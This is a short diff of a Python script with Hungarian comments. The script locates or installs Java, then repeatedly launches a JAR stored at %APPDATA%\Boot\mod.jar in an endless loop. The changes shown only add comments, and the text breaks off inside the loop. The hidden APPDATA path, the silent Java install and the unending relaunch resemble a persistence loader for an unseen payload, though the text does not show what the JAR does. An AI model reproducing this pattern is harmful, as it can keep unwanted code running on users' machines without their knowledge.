@@ -63,14 +63,15 @@ def install_java21():
 
 JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")
 
+# --- CSAK EGYSZER KERESI MEG A JAVAT (indításkor) ---
 java_path = find_java()
 if not java_path:
     install_java21()
     java_path = find_java()
-
 if not java_path:
-    java_path = "java"
+    java_path = "java"  # visszaesés
 
+# --- VÉGTELEN CIKLUS: CSAK A JAR-T INDÍTJA, NEM KERES ÚJRA ---
 while True:
     try:
         subprocess.Popen([java_path, "-jar", JAR_PATH],
